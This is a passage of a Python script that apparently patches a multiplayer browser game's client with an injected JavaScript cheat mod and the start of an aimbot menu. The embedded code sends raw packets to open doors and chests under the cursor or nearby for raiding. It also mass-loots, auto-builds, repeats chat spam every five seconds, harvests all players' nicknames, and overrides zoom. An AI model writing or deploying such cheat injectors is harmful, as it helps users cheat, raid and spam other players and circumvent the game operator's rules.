    return document.getElementById("can") || document.querySelector("#can") || document.querySelector("canvas");
  }

  /* ===== Open under cursor (RMB) ===== */
  /* Door/chest opening ported from the reference mod: entities are indexed
     in _grok_subject_data by their 100px grid cell ("gx:gy"); a right click
     snaps the mouse world position to the same grid and sends the stored
     [packetId, id, owner] packet for exactly that cell's object. */
  var _grok_subject_data = globalThis._grok_subject_data || {};
  globalThis._grok_subject_data = _grok_subject_data;
  function grokRebuildSubjectData() {
    globalThis.grokRebuildSubjectData = grokRebuildSubjectData;
    _grok_subject_data = globalThis._grok_subject_data || {};
    globalThis._grok_subject_data = _grok_subject_data;
    try {
      if (typeof Entitie === "undefined" || !Entitie["__T_BUCKETS__"]) return;
      if (typeof __T_INVARR__ === "undefined") return;
      for (var ti = 0; ti <= 30; ti++) {
        var units = Entitie["__T_BUCKETS__"][ti];
        if (!units) continue;
        var len = 0;
        try { len = units.length || 0; } catch (e) { continue; }
        for (var i = 0; i < len; i++) {
          var ent = null;
          try { ent = units[i]; } catch (e) {}
          if (!ent) continue;
          var extra;
          try { extra = ent.__T_EXTRA__; } catch (e) { continue; }
          if (extra === undefined || extra === null) continue;
          var item;
          try { item = __T_INVARR__[extra >> 7]; } catch (e) { continue; }
          if (!item) continue;
          var packetId = 0;
          try { packetId = item.__T_ITEMPKT__; } catch (e) {}
          var eid = undefined;
          try { eid = ent[__T_MYID__]; } catch (e) {}
          try { if (eid === undefined) eid = ent[PLAYER]; } catch (e) {}
          try { if (eid === undefined) eid = ent[id]; } catch (e) {}
          try { if (eid === undefined || eid === null || eid === 0) eid = ent.id; } catch (e) {}
          var pos = grokGetPos(ent);
          var epid = 0;
          try { epid = ent.__T_EPID__; } catch (e) {}
          try { if (epid === undefined || epid === null) epid = 0; } catch (e) {}
          /* door/building entities carry their authoritative grid cell in
             __T_GX__/__T_GY__ (same fields the client uses for the owner overlay) -
             the world position anchors differ, so pos-based cells are off */
          var gx = undefined, gy = undefined;
          try { gx = ent.__T_GX__; gy = ent.__T_GY__; } catch (e) {}
          var _hasGrid = (typeof gx === "number" && typeof gy === "number");
          if (!_hasGrid && pos) {
            gx = Math.floor(pos.x / 100);
            gy = Math.floor(pos.y / 100);
          }
          if (!(packetId > 0)) {
            /* doors keep the packetId on the sub-definition selected by the
               entity's sprite index - same lookup the client does when
               resolving the interact packet */
            try {
              var sub = __T_INVARR__[item[id]];
              if (sub && sub.__T_SUBDEF__) {
                var subDef = sub.__T_SUBDEF__[ent.__T_SUBDEF__];
                if (subDef) packetId = subDef.__T_ITEMPKT__;
              }
            } catch (e) {}
          }
          if (!(packetId > 0)) continue;
          if (!pos) continue;
          if (eid === undefined || eid === null || eid < 0) continue;
          if (typeof gx === "number" && typeof gy === "number") {
            var key = gx + ":" + gy;
            _grok_subject_data[key] = [packetId, eid, epid];
            /* also register under the pos-derived cell when it differs, so a
               door stays clickable even if its grid fields are stale */
            var key2 = Math.floor(pos.x / 100) + ":" + Math.floor(pos.y / 100);
            if (key2 !== key) _grok_subject_data[key2] = [packetId, eid, epid];
          }
        }
      }
    } catch (e) {}
  }

  function grokFindEntityUnderCursor() {
    try {
      grokRebuildSubjectData();
      if (typeof GetAllTargets === "undefined" || !GetAllTargets.mouseMapCords) return null;
      var gridSize = 100;
      var mouseX = Math.round(GetAllTargets.mouseMapCords.x);
      var mouseY = Math.round(GetAllTargets.mouseMapCords.y);
      var _x = Math.floor(mouseX / gridSize);
      var _y = Math.floor(mouseY / gridSize);
      _grok_subject_data = globalThis._grok_subject_data || _grok_subject_data;
      var _position = _x + ":" + _y;
      if (_position in _grok_subject_data) {
        var d = _grok_subject_data[_position];
        return { packetId: d[0], id: d[1], pid: d[2] };
      }
      /* standing in a doorway shifts the cursor's snapped cell off the
         clicked door - fall back to the 3x3 neighborhood and pick the cell
         whose center is closest to the actual cursor position */
      var best = null, bestD2 = 75 * 75;
      for (var oy = -1; oy <= 1; oy++) {
        for (var ox = -1; ox <= 1; ox++) {
          var k = (_x + ox) + ":" + (_y + oy);
          var d2 = _grok_subject_data[k];
          if (!d2) continue;
          var cx = (_x + ox) * gridSize + gridSize / 2;
          var cy = (_y + oy) * gridSize + gridSize / 2;
          var cd = (cx - mouseX) * (cx - mouseX) + (cy - mouseY) * (cy - mouseY);
          if (cd < bestD2) { bestD2 = cd; best = d2; }
        }
      }
      if (best) return { packetId: best[0], id: best[1], pid: best[2] };
    } catch (e) {}
    return null;
  }

  /* Nearest openable entity (doors/chests/...) within OpenNearRadius world
     units of the player - lets RMB open a chest standing 1.5 blocks away
     even when the cursor is not exactly on its sprite. */
  function grokFindNearestInteractable() {
    try {
      if (typeof Entitie === "undefined" || !Entitie["__T_BUCKETS__"]) return null;
      if (typeof __T_INVARR__ === "undefined") return null;
      if (!World || !World.PLAYER) return null;
      var me = grokGetPos(World.PLAYER);
      if (!me) return null;
      var maxD = GROK_MOD.OpenNearRadius || 150;
      var best = null, bestD2 = maxD * maxD;
      for (var ti = 0; ti <= 30; ti++) {
        var units = Entitie["__T_BUCKETS__"][ti];
        if (!units) continue;
        var len = 0;
        try { len = units.length || 0; } catch (e) { continue; }
        for (var i = 0; i < len; i++) {
          var ent = null;
          try { ent = units[i]; } catch (e) {}
          if (!ent) continue;
          var extra;
          try { extra = ent.__T_EXTRA__; } catch (e) { continue; }
          if (extra === undefined || extra === null) continue;
          var item;
          try { item = __T_INVARR__[extra >> 7]; } catch (e) { continue; }
          if (!item) continue;
          var packetId = 0;
          try { packetId = item.__T_ITEMPKT__; } catch (e) {}
          if (!(packetId > 0)) {
            try {
              var sub = __T_INVARR__[item[id]];
              if (sub && sub.__T_SUBDEF__) {
                var subDef = sub.__T_SUBDEF__[ent.__T_SUBDEF__];
                if (subDef) packetId = subDef.__T_ITEMPKT__;
              }
            } catch (e) {}
          }
          if (!(packetId > 0)) continue;
          var pos = grokGetPos(ent);
          if (!pos) continue;
          var eid = undefined;
          try { eid = ent[__T_MYID__]; } catch (e) {}
          try { if (eid === undefined) eid = ent[PLAYER]; } catch (e) {}
          try { if (eid === undefined) eid = ent[id]; } catch (e) {}
          try { if (eid === undefined || eid === null || eid === 0) eid = ent.id; } catch (e) {}
          if (eid === undefined || eid === null || eid < 0) continue;
          var epid = 0;
          try { epid = ent.__T_EPID__; } catch (e) {}
          try { if (epid === undefined || epid === null) epid = 0; } catch (e) {}
          var dx = pos.x - me.x, dy = pos.y - me.y;
          var d2 = dx * dx + dy * dy;
          if (d2 < bestD2) {
            bestD2 = d2;
            best = { packetId: packetId, id: eid, pid: epid };
          }
        }
      }
      return best;
    } catch (e) { return null; }
  }

  function grokHandleActionOpen() {
    try {
      var target = grokFindEntityUnderCursor();
      if (!target && World && World.PLAYER && World.PLAYER.__T_ITEMPKT__ > 0 && World.PLAYER.__T_BID__ >= 0) {
        target = { packetId: World.PLAYER.__T_ITEMPKT__, id: World.PLAYER.__T_BID__, pid: World.PLAYER.__T_BPID__ };
      }
      if (!target) target = grokFindNearestInteractable();
      if (target && target.packetId > 0) {
        GROK_MOD.hit = false;
        grokNetSend([target.packetId, target.id, target.pid || 0]);
        return;
      }
    } catch (e) {}
  }

  document.addEventListener("mousedown", function (ev) {
    if (ev.button === 2 && __gk(GROK_MOD.OpenEverythingByClick)) {
      GROK_MOD.hit = false;
      grokHookAttackBlock();
      if (grokIsConnected()) grokHandleActionOpen();
    }
  }, true);

  document.addEventListener("mouseup", function (ev) {
    if (ev.button === 2) GROK_MOD.hit = true;
  }, true);

  document.addEventListener("contextmenu", function (ev) {
    if (GROK_MOD.OpenEverythingByClick) ev.preventDefault();
  }, true);

  /* ===== SpamChat ===== */
  function grokSendChat(msg) {
    try {
      if (!msg) return;
      // 1) native client chat (handles rate-limit correctly)
      try {
        if (typeof __T_NET__ !== "undefined" && typeof __T_NET__.__T_SEND__ === "function") {
          __T_NET__.__T_SEND__(msg);
        } else {
          grokNetSend([1, msg]);
        }
      } catch (e1) {
        try { grokNetSend([1, msg]); } catch (e2) {}
      }
      // 2) local bubble if available
      try {
        if (World && World.PLAYER && World.players) {
          var me = World.players[World.PLAYER[__T_MYID__]];
          if (me && me.text && me.text.push) me.text.push(msg);
        }
      } catch (e3) {}
    } catch (e) {}
  }

  function grokSpamChat() {
    if (__gk(GROK_MOD.SpamChatEnabled)) {
      if (_grok_spam_iv) clearInterval(_grok_spam_iv);
      grokSendChat(GROK_MOD.SpamChatText);
      _grok_spam_iv = setInterval(function () {
        grokSendChat(GROK_MOD.SpamChatText);
      }, 5000);
    } else {
      if (_grok_spam_iv) { clearInterval(_grok_spam_iv); _grok_spam_iv = null; }
    }
  }

  /* ===== Copy nicknames ===== */
  function grokCopyNickname(idStr) {
    try {
      var id = parseInt(idStr, 10);
      if (!World || !World.players || !World.players[id]) { alert("Player not found"); return; }
      var nick = grokGetNick(World.players[id]).split("#")[0];
      if (!nick) { alert("No nickname"); return; }
      alert(nick);
      if (navigator.clipboard) navigator.clipboard.writeText(nick);
    } catch (e) { alert("Error"); }
  }

  function grokCopyAllNicknames() {
    try {
      var result = [];
      if (World && World.players) {
        for (var pid in World.players) {
          var n = grokGetNick(World.players[pid]).replace(/#\d+$/, "");
          if (n) result.push(n);
        }
      }
      if (result.length) {
        if (navigator.clipboard) navigator.clipboard.writeText(result.join("\n"));
        alert("Copied " + result.length + " nicknames");
      } else alert("No players found");
    } catch (e) { alert("Error"); }
  }

  /* ===== PlayerList ===== */
  function grokEnsurePlayerList() {
    if (_grok_plOverlay && _grok_plOverlay.parentNode) return _grok_plOverlay;
    _grok_plOverlay = document.createElement("div");
    _grok_plOverlay.id = "grok-playerlist";
    _grok_plOverlay.style.cssText = "position:fixed;inset:0;z-index:999998;background:rgba(0,0,0,0.55);color:#fff;font:13px Viga,Arial,sans-serif;overflow:auto;display:none;padding:16px 20px;pointer-events:none;";
    (document.body || document.documentElement).appendChild(_grok_plOverlay);
    return _grok_plOverlay;
  }

  setInterval(function () {
    try {
      var ov = grokEnsurePlayerList();
      if (!__gk(GROK_MOD.PlayersListEnabled)) { ov.style.display = "none"; return; }
      ov.style.display = "block";
      var rows = [], count = 0;
      if (World && World.players) {
        for (var pid in World.players) {
          var pobj = World.players[pid];
          if (!grokPlayerActive(pobj)) continue;
          var nick = grokGetNick(pobj);
          var isMe = false;
          try { isMe = World.PLAYER && String(pid) === String(World.PLAYER[__T_MYID__]); } catch (e) {}
          var clanLabel = grokGetPlayerClanLabel(pobj);
          var karma = -1;
          try { karma = pobj.__T_KARMA__; } catch (e) {}
          var karmaHtml = "";
          if (typeof karma === "number" && karma >= 0) {
            var kimgs = ["img/karma4.png", "img/karma3.png", "img/karma2.png", "img/karma1.png", "img/karma0.png", "img/karma5.png"];
            if (karma >= kimgs.length) karma = kimgs.length - 1;
            karmaHtml = ' <img src="' + kimgs[karma] + '" style="width:22px;height:22px;vertical-align:-5px">';
          }
          /* player list entry styled like the reference mod: own nick yellow
             (#FFF200), others white; clan tag in TeamClanColor for me and my
             teammates, EnemyClanColor for enemies */
          var sameClan = grokSameClanPlayer(pobj);
          var nickColor = isMe ? "#FFF200" : "#FFFFFF";
          var clanColor = (isMe || sameClan) ? "#83F6A4" : "#FF0000";
          rows.push('<div style="color:' + nickColor + ';min-width:240px">#' + pid + " " +
            (clanLabel ? '<span style="color:' + clanColor + '">[' + grokHtmlEscape(clanLabel) + ']</span> ' : '') +
            grokHtmlEscape(nick) + karmaHtml + "</div>");
          count++;
        }
      }
      ov.innerHTML = '<div style="text-align:right;margin-bottom:10px;font-size:15px">People On Server: ' + count + "</div><div style=\"display:flex;flex-wrap:wrap;gap:6px 22px\">" + rows.join("") + "</div>";
    } catch (e) {}
  }, 400);

  /* ===== AutoLoot / AutoBuild (UNCHANGED logic) ===== */
  function grokFAutoLootTick() {
    if (!__gk(GROK_MOD.FAutoLootEnabled)) return;
    try {
      if (typeof World === "undefined" || !World.PLAYER) return;
      var now = Date.now();
      if (now - GROK_MOD._lastLoot < 20) return;
      GROK_MOD._lastLoot = now;

      var lootId = World.PLAYER.__T_LOOT12__;
      if (lootId === undefined || lootId === null || lootId < 0) {
        lootId = World.PLAYER.__T_LOOTFB__;
      }
      if (lootId !== undefined && lootId !== null && lootId >= 0) {
        grokNetSend([12, lootId]);
      }

      if (typeof Entitie === "undefined" || !Entitie["__T_BUCKETS__"]) return;
      var me = grokGetPos(World.PLAYER);
      if (!me) return;
      var range = GROK_MOD.FAutoLootRange || 224;
      var range2 = range * range;
      var cand = [];
      /* loot entities live in the dedicated bucket Entitie.__T_BUCKETS__[__T_LOOTTYPE__]
         (same bucket the game uses for the E-pickup hint) - scan it via the
         meta index when available, like the client does */
      var units = undefined;
      try { units = Entitie["__T_BUCKETS__"][__T_LOOTTYPE__]; } catch (e) {}
      var meta = null;
      try { meta = Entitie[__T_METAKEY__][__T_LOOTTYPE__]; } catch (e) {}
      if (units) {
        var count = 0;
        try {
          count = (meta && meta.__T_METACOUNT__) ? meta.__T_METACOUNT__ : (units.length || 0);
        } catch (e) {}
        for (var i = 0; i < count; i++) {
          var ent = null;
          try {
            ent = (meta && meta.__T_METAIDX__) ? units[meta.__T_METAIDX__[i]] : units[i];
          } catch (e) {}
          if (!ent) continue;
          var pos = grokGetPos(ent);
          if (!pos) continue;
          var dx = me.x - pos.x, dy = me.y - pos.y;
          var d2 = dx * dx + dy * dy;
          if (d2 >= range2) continue;
          var lid = undefined;
          try { lid = ent[id]; } catch (e) {}
          try { if (lid === undefined) lid = ent.id; } catch (e) {}
          if (lid === undefined || lid === null || lid < 0) continue;
          if (lid === lootId) continue;
          cand.push({ lid: lid, d2: d2 });
        }
      }
      cand.sort(function (a, b) { return a.d2 - b.d2; });
      var maxSend = GROK_MOD.FAutoLootMaxSend || 8;
      for (var ci = 0; ci < cand.length && ci < maxSend; ci++) {
        grokNetSend([12, cand[ci].lid]);
      }
    } catch (err) {}
  }

  /* ===== build angle hook (auto-detected) ===== */
  function grokMouseAngle() {
    try {
      var canvas = grokGetCanvas();
      if (!canvas) return null;
      var rect = canvas.getBoundingClientRect();
      var sx = _grok_mouse.x - rect.left;
      var sy = _grok_mouse.y - rect.top;
      return Math.atan2(sy - rect.height / 2, sx - rect.width / 2);
    } catch (e) { return null; }
  }

  function grokClientAngle() {
    try {
      var a = (__T_ANGLEEXPR__);
      if (typeof a === "number" && isFinite(a)) return a;
    } catch (e) {}
    return null;
  }

  function grokBuildAngle() {
    var mode = GROK_MOD.AutoBuildAngleMode;
    if (mode === "fixed") return (GROK_MOD.AutoBuildAngle || 0) * Math.PI / 180;
    if (mode === "mouse") {
      var m = grokMouseAngle();
      if (m !== null) return m;
    }
    var c = grokClientAngle();
    if (c !== null) return c;
    var m2 = grokMouseAngle();
    return m2 === null ? 0 : m2;
  }

  /* recompute the target cell from the live angle instead of reading the
     stale World.PLAYER values (they are only refreshed while the build ghost
     is being drawn) */
  function grokBuildCell() {
    try {
      if (!World || !World.PLAYER) return null;
      var ang = grokBuildAngle();
      GROK_MOD._angle = ang;
      var j = __T_GJANG__;
      var i = __T_GIANG__;
      if (typeof i !== "number" || typeof j !== "number") return null;
      if (!isFinite(i) || !isFinite(j)) return null;
      return { i: i, j: j };
    } catch (e) { return null; }
  }

  function grokAutoBuildTick() {
    if (!__gk(GROK_MOD.AutoBuildEnabled)) return;
    try {
      if (typeof World === "undefined" || !World.PLAYER) return;
      var now = Date.now();
      if (now - GROK_MOD._lastBuild < 30) return;
      var rot = World.PLAYER.__T_ROT__;
      var bi, bj;
      var cell = GROK_MOD.AutoBuildAngleHook ? grokBuildCell() : null;
      if (cell) {
        bi = cell.i;
        bj = cell.j;
        if (GROK_MOD.AutoBuildSyncPlayer) {
          /* keep the client in sync so its own ghost/validation matches */
          try { World.PLAYER.__T_GI__ = bi; } catch (e) {}
          try { World.PLAYER.__T_GJ__ = bj; } catch (e) {}
        }
      } else {
        bi = World.PLAYER.__T_GI__;
        bj = World.PLAYER.__T_GJ__;
      }
      GROK_MOD._cell = bi + "," + bj;
      if (rot === undefined || bi === undefined || bj === undefined) return;
      if (typeof bi === "number" && bi < 0) return;
      if (typeof bj === "number" && bj < 0) return;
      grokNetSend([14, rot, bi, bj]);
      GROK_MOD._lastBuild = now;
    } catch (err) {}
  }


  /* ===== ZOOM (UNCHANGED logic) ===== */
  function grokApplyZoom(dir, steps) {
    try {
      if (typeof __T_CAM__ === "undefined") return;
      steps = steps || 1;
      var step = 0.1;
      var maxZ = 1.0;
      var minZ = -1.0;
      for (var s = 0; s < steps; s++) {
        var cur = __T_CAM__[__T_SCALEKEY__];
        if (typeof cur !== "number") cur = 0;
        if (dir > 0) {
          if (cur >= maxZ) break;
          cur += step;
          if (cur > maxZ) cur = maxZ;
        } else {
          if (cur <= minZ) break;
          cur -= step;
          if (cur < minZ) cur = minZ;
        }
        __T_CAM__[__T_SCALEKEY__] = cur;
      }
      GROK_MOD.zoom = __T_CAM__[__T_SCALEKEY__];
    } catch (e) {}
  }

  function grokZoomTick() {
    try {
      if (typeof __T_CAM__ !== "undefined") {
        var z = __T_CAM__[__T_SCALEKEY__];
        if (typeof z === "number") GROK_MOD.zoom = z;
      }
    } catch (e) {}
  }

  setInterval(function () {
    try { grokFAutoLootTick(); } catch (e) {}
    try { grokAutoBuildTick(); } catch (e2) {}
    try { grokZoomTick(); } catch (e3) {}
  }, 25);

  window.addEventListener("keydown", function (ev) {
    if (ev.code === "Equal" || ev.code === "NumpadAdd") {
      grokApplyZoom(1, 1);
      return;
    }
    if (ev.code === "Minus" || ev.code === "NumpadSubtract") {
      grokApplyZoom(-1, 1);
      return;
    }
    if (ev.repeat) return;
    try {
      var t = ev.target;
      if (t && (t.tagName === "INPUT" || t.tagName === "TEXTAREA" || t.isContentEditable)) return;
    } catch (e) {}
    if (ev.code === GROK_MOD.FAutoLootKey) {
      GROK_MOD.FAutoLootEnabled = !GROK_MOD.FAutoLootEnabled;
      console.log("[GROK] AutoLoot: " + (GROK_MOD.FAutoLootEnabled ? "ON" : "OFF"));
    }
    if (ev.code === GROK_MOD.AutoBuildKey) {
      GROK_MOD.AutoBuildEnabled = !GROK_MOD.AutoBuildEnabled;
      console.log("[GROK] AutoBuild: " + (GROK_MOD.AutoBuildEnabled ? "ON" : "OFF"));
    }
    if (ev.code === GROK_MOD.PlayersListKey) {
      GROK_MOD.PlayersListEnabled = !GROK_MOD.PlayersListEnabled;
    }
  }, true);

  window.addEventListener("wheel", function (ev) {
    try {
      ev.preventDefault();
      ev.stopImmediatePropagation();
      grokApplyZoom(ev.deltaY < 0 ? 1 : -1, 1);
    } catch (e) {}
  }, { passive: false, capture: true });

  /* ===== folders inside the single "DEVAST BEST SCRIPT" menu ===== */
  function grokBuildMenu(gui) {
    try {
      var fAuto = gui.addFolder("Automation");
      fAuto.add(GROK_MOD, "FAutoLootEnabled").name("Fast AutoLoot (Q)").listen();
      fAuto.add(GROK_MOD, "FAutoLootRange", 50, 2000).step(1).name("Loot radius").listen();
      fAuto.add(GROK_MOD, "FAutoLootMaxSend", 1, 30).step(1).name("Loot max/tick").listen();
      fAuto.add(GROK_MOD, "AutoBuildEnabled").name("AutoBuild (B)").listen();
      fAuto.add(GROK_MOD, "AutoBuildAngleHook").name("Build: angle hook").listen();
      fAuto.add(GROK_MOD, "AutoBuildAngleMode", ["client", "mouse", "fixed"]).name("Build: angle from").listen();
      fAuto.add(GROK_MOD, "AutoBuildAngle", -180, 180).step(1).name("Build: fixed angle").listen();
      fAuto.add(GROK_MOD, "AutoBuildSyncPlayer").name("Build: sync ghost").listen();


      var fRaid = gui.addFolder("Raid / Open");
      fRaid.add(GROK_MOD, "OpenEverythingByClick").name("Open under Cursor (RMB)").listen();
      fRaid.add(GROK_MOD, "OpenHitRadius", 10, 200).step(5).name("Open: hitbox px").listen();
      fRaid.add(GROK_MOD, "OpenNearRadius", 50, 500).step(25).name("Open: near radius").listen();
      fRaid.add(GROK_MOD, "hit").name("Allow Attack packet").listen();

      var fChat = gui.addFolder("Spam Chat");
      fChat.add(GROK_MOD, "SpamChatEnabled").name("Enabled").listen().onChange(function () { grokSpamChat(); });
      fChat.add(GROK_MOD, "SpamChatText").name("Text");

      var fNick = gui.addFolder("Copy Nicknames");
      fNick.add(GROK_MOD, "PlayerId").name("Player ID");
      fNick.add({ Copy: function () {
        var id = GROK_MOD.PlayerId;
        if (/^\d+$/.test(String(id)) && +id >= 1 && +id <= 120) grokCopyNickname(id);
        else alert("Enter valid id 1-120");
      } }, "Copy");
      fNick.add({ CopyAll: function () { grokCopyAllNicknames(); } }, "CopyAll").name("Copy All");

      var fList = gui.addFolder("Player List");
      fList.add(GROK_MOD, "PlayersListEnabled").name("Show List (L)").listen();

      var fZoom = gui.addFolder("Zoom");
      fZoom.add(GROK_MOD, "zoom", -1, 1).step(0.05).name("Zoom").listen();
      fZoom.add({ ZoomIn: function () { grokApplyZoom(1, 1); } }, "ZoomIn");
      fZoom.add({ ZoomOut: function () { grokApplyZoom(-1, 1); } }, "ZoomOut");

      console.log("[GROK] folders added to DEVAST BEST SCRIPT menu (H / \u0440 hide/show)");
    } catch (e) { console.warn("[GROK] menu error", e); }
  }

  (function grokWaitGui(tries) {
    tries = tries || 0;
    if (window.__grokFoldersDone) return;
    var gui = window.AimbotMenu;
    if (gui && gui.addFolder) {
      window.__grokFoldersDone = true;
      grokBuildMenu(gui);
      return;
    }
    if (tries > 600) return;
    setTimeout(function () { grokWaitGui(tries + 1); }, 100);
  })();

  /* ===== single menu toggle: H / h / Russian р / Р ===== */
  window.addEventListener("keydown", function (ev) {
    try {
      var t = ev.target;
      if (t && (t.tagName === "INPUT" || t.tagName === "TEXTAREA" || t.isContentEditable)) return;
      var k = ev.key || "";
      var isToggle = (ev.code === "KeyH") || k === "h" || k === "H" || k === "\u0440" || k === "\u0420";
      if (!isToggle) return;
      var gui = window.AimbotMenu;
      if (!gui || !gui.domElement) return;
      var el = gui.domElement;
      el.style.display = (el.style.display === "none") ? "" : "none";
      ev.stopPropagation();
    } catch (e) {}
  }, true);

  window.GROK_MOD = GROK_MOD;
  // ========== END GROK MOD ==========
"""


def generate_mod(m: dict) -> str:
    net = m.get("net") or {}
    ent = m.get("entities") or {}
    it = m.get("interact") or {}
    inv = m.get("inventory") or {}
    lo = m.get("loot") or {}
    z = m.get("zoom") or {}
    ba = m.get("build_angle") or {}
    b = m.get("build") or {}
    cl = m.get("clan") or {}
    aliases = list(net.get("json_aliases") or [])
    while len(aliases) < 4:
        aliases.append("stringify")
    skip = {lo.get("packet12"), lo.get("nearest"), m.get("myid_key"), m.get("team")}
    loot_cands = [c[1] for c in (lo.get("candidates") or []) if c[1] not in skip]
    subs = {
        "__T_NET__": net.get("net_obj") or "NET_UNKNOWN",
        "__T_SEND__": net.get("send_method") or "send",
        "__T_JA0__": aliases[0], "__T_JA1__": aliases[1],
        "__T_JA2__": aliases[2], "__T_JA3__": aliases[3],
        "__T_ROT__": b.get("rot") or "UNKNOWN_ROT",
        "__T_GI__": b.get("grid_i") or "UNKNOWN_GRID_I",
        "__T_GJ__": b.get("grid_j") or "UNKNOWN_GRID_J",
        "__T_LOOT12__": lo.get("packet12") or "undefined",
        "__T_LOOTFB__": loot_cands[0] if loot_cands else "undefined",
        "__T_LOOTTYPE__": lo.get("loot_type") if lo.get("loot_type") is not None else "0",
        "__T_BUCKETS__": ent.get("buckets") or "0",
        "__T_METAKEY__": ent.get("meta_key") or "buckets",
        "__T_CAM__": z.get("cam") or "undefined",
        "__T_SCALEKEY__": z.get("scale_key") or "undefined",
        "__T_NICK__": (m.get("nickname") or {}).get("field") or "nickname",
        "__T_MYID__": m.get("myid_key") or "id",
        "__T_ITEMPKT__": it.get("item_packet_field") or it.get("packet_id") or "undefined",
        "__T_BID__": it.get("building_id") or "undefined",
        "__T_BPID__": it.get("building_pid") or "undefined",
        "__T_EPID__": it.get("entity_pid_key") or "undefined",
        "__T_GX__": it.get("entity_gx_key") or "undefined",
        "__T_GY__": it.get("entity_gy_key") or "undefined",
        "__T_SUBDEF__": it.get("subdef_arr") or "undefined",
        "__T_EID__": it.get("entity_id_key") or "id",
        "__T_INVARR__": inv.get("inventory") or "undefined",
        "__T_EXTRA__": inv.get("entity_extra") or "undefined",
        "__T_KARMA__": m.get("karma") or "undefined",
        "__T_TEAM__": m.get("team") or "clan",
        "__T_CLANTBL__": cl.get("table") or "clans",
        "__T_CLANNM__": cl.get("name") or "name",
        "__T_ACTIONFN__": m.get("action_fn") or net.get("send_method") or "send",
        "__T_METACOUNT__": (m.get("meta_props") or {}).get("count") or "length",
        "__T_METAIDX__": (m.get("meta_props") or {}).get("index") or "length",
        "__T_ANGLEEXPR__": ba.get("angle_expr") or "0",
        "__T_GIANG__": (ba.get("grid_i_tpl") or "0").replace("%A%", "ang"),
        "__T_GJANG__": (ba.get("grid_j_tpl") or "0").replace("%A%", "ang"),
    }
    out = GROK_TAIL
    for k, v in subs.items():
        out = out.replace(k, str(v))
    return out


def find_insert_point(src: str, ent: str = ENTITY_OBJ_DEFAULT) -> int:
    i = src.find("function WaitANDrunHTML")
    if i >= 0:
        return i
    i = src.find(ent + ".init(")
    if i >= 0:
        j = src.find(";", i)
        return j + 1 if j >= 0 else i
    return max(0, len(src) - 5000)


def inject(src: str, mod: str, ent: str = ENTITY_OBJ_DEFAULT) -> str:
    start = src.find("// ========== GROK MOD:")
    if start >= 0:
        end = src.find("// ========== END GROK MOD", start)
        if end >= 0:
            end = src.find("\n", end)
            if end < 0:
                end = len(src)
            else:
                end += 1
            src = src[:start] + src[end:]
    # also strip old DASDAS-style blocks if present at end (optional safety)
    pos = find_insert_point(src, ent)
    return src[:pos] + "\n" + mod + "\n" + src[pos:]


def apply_overrides(mapping: dict, overrides: list[str]) -> None:
    for ov in overrides:
        if "=" not in ov:
            continue
        key, val = ov.split("=", 1)
        if key == "loot":
            mapping.setdefault("loot", {})["packet12"] = val
            continue
        if key == "loot.nearest":
            mapping.setdefault("loot", {})["nearest"] = val
            continue
        if key == "loot.packet12":
            mapping.setdefault("loot", {})["packet12"] = val
            continue
        if key in ("entities.obj", "entity_obj"):
            mapping.setdefault("entities", {})["obj"] = val
            continue
        if key == "buckets":
            mapping.setdefault("entities", {})["buckets"] = val
            continue
        if key == "zoom.cam":
            mapping.setdefault("zoom", {})["cam"] = val
            continue
        if key == "zoom.scale_key":
            mapping.setdefault("zoom", {})["scale_key"] = val
            continue
        if key == "nick":
            mapping.setdefault("nickname", {})["field"] = val
            continue
        if key == "interact.packet_id":
            mapping.setdefault("interact", {})["packet_id"] = val
            continue
        if key == "interact.building_id":
            mapping.setdefault("interact", {})["building_id"] = val
            continue
        if key == "interact.building_pid":
            mapping.setdefault("interact", {})["building_pid"] = val
            continue
        if key == "inventory":
            mapping.setdefault("inventory", {})["inventory"] = val
            continue
        if key == "entity_extra":
            mapping.setdefault("inventory", {})["entity_extra"] = val
            continue
        if key == "item_packet_field":
            mapping.setdefault("interact", {})["item_packet_field"] = val
            continue
        parts = key.split(".")
        cur = mapping
        for p in parts[:-1]:
            cur = cur.setdefault(p, {})
        cur[parts[-1]] = val




# -------------------- Aimbot port (auto-detect + inject) --------------------

AIMBOT_BLOCK = r"""  /* ===================== dat.GUI (from message84) ===================== */
(function(e, t) {
    if (typeof exports == "object" && typeof module != "undefined") {
        t(exports);
    } else if (typeof define == "function" && define.amd) {
        define(["exports"], t);
    } else {
        t(e.dat = {});
    }
}
)(__TOK_WINDOW__, function(e) {
    "use strict";

    function t(e, t) {
        var n = e.__state.conversionName.toString();
        var o = Math.round(e.r);
        var i = Math.round(e.g);
        var r = Math.round(e.b);
        var s = e.a;
        var a = Math.round(e.h);
        var l = e.s.toFixed(1);
        var d = e.v.toFixed(1);
        if (t || n === "THREE_CHAR_HEX" || n === "SIX_CHAR_HEX") {
            for (var c = e.hex.toString(16); c.length < 6; ) {
                c = "0" + c;
            }
            return "#" + c;
        }
        if (n === "CSS_RGB") {
            return "rgb(" + o + "," + i + "," + r + ")";
        } else if (n === "CSS_RGBA") {
            return "rgba(" + o + "," + i + "," + r + "," + s + ")";
        } else if (n === "HEX") {
            return "0x" + e.hex.toString(16);
        } else if (n === "RGB_ARRAY") {
            return "[" + o + "," + i + "," + r + "]";
        } else if (n === "RGBA_ARRAY") {
            return "[" + o + "," + i + "," + r + "," + s + "]";
        } else if (n === "RGB_OBJ") {
            return "{r:" + o + ",g:" + i + ",b:" + r + "}";
        } else if (n === "RGBA_OBJ") {
            return "{r:" + o + ",g:" + i + ",b:" + r + ",a:" + s + "}";
        } else if (n === "HSV_OBJ") {
            return "{h:" + a + ",s:" + l + ",v:" + d + "}";
        } else if (n === "HSVA_OBJ") {
            return "{h:" + a + ",s:" + l + ",v:" + d + ",a:" + s + "}";
        } else {
            return "unknown format";
        }
    }
    function n(e, t, n) {
        Object.defineProperty(e, t, {
            get: function() {
                if (this.__state.space === "RGB") {
                    return this.__state[t];
                } else {
                    I.recalculateRGB(this, t, n);
                    return this.__state[t];
                }
            },
            set: function(e) {
                if (this.__state.space !== "RGB") {
                    I.recalculateRGB(this, t, n);
                    this.__state.space = "RGB";
                }
                this.__state[t] = e;
            }
        });
    }
    function o(e, t) {
        Object.defineProperty(e, t, {
            get: function() {
                if (this.__state.space === "HSV") {
                    return this.__state[t];
                } else {
                    I.recalculateHSV(this);
                    return this.__state[t];
                }
            },
            set: function(e) {
                if (this.__state.space !== "HSV") {
                    I.recalculateHSV(this);
                    this.__state.space = "HSV";
                }
                this.__state[t] = e;
            }
        });
    }
    function i(e) {
        if (e === "0" || S.isUndefined(e)) {
            return 0;
        }
        var t = e.match(U);
        if (S.isNull(t)) {
            return 0;
        } else {
            return parseFloat(t[1]);
        }
    }
    function r(e) {
